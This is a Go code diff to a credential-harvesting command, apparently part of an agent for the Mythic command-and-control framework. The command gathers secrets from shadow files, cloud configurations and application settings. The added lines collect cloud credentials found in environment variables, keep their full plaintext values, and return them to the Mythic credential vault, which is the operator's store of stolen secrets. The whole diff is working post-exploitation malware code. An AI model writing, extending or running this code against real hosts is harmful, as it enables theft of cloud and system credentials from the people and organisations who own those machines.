@@ -13,8 +13,10 @@ import (
 
 type CredHarvestCommand struct{}
 
-func (c *CredHarvestCommand) Name() string        { return "cred-harvest" }
-func (c *CredHarvestCommand) Description() string { return "Harvest credentials from shadow, cloud configs, and application secrets (T1552)" }
+func (c *CredHarvestCommand) Name() string { return "cred-harvest" }
+func (c *CredHarvestCommand) Description() string {
+	return "Harvest credentials from shadow, cloud configs, and application secrets (T1552)"
+}
 
 type credHarvestArgs struct {
 	Action string `json:"action"` // shadow, cloud, configs, windows, all
@@ -165,6 +167,7 @@ var cloudCredPaths = []struct {
 
 func credCloud(args credHarvestArgs) structs.CommandResult {
 	var sb strings.Builder
+	var creds []structs.MythicCredential
 
 	sb.WriteString("Cloud & Infrastructure Credentials\n")
 	sb.WriteString(strings.Repeat("=", 60) + "\n\n")
@@ -205,6 +208,15 @@ func credCloud(args credHarvestArgs) structs.CommandResult {
 					display = display[:20] + "..." + display[len(display)-10:]
 				}
 				sb.WriteString(fmt.Sprintf("  [ENV] %s=%s\n", env, display))
+
+				// Report env var credentials to Mythic vault
+				creds = append(creds, structs.MythicCredential{
+					CredentialType: "plaintext",
+					Realm:          cred.name,
+					Account:        env,
+					Credential:     val,
+					Comment:        "cred-harvest cloud env",
+				})
 			}
 		}
 
@@ -223,11 +235,15 @@ func credCloud(args credHarvestArgs) structs.CommandResult {
 	// GCP service account JSON files
 	credCloudGCPServiceAccounts(&sb, homes)
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 func credCloudK8sServiceAccount(sb *strings.Builder) {
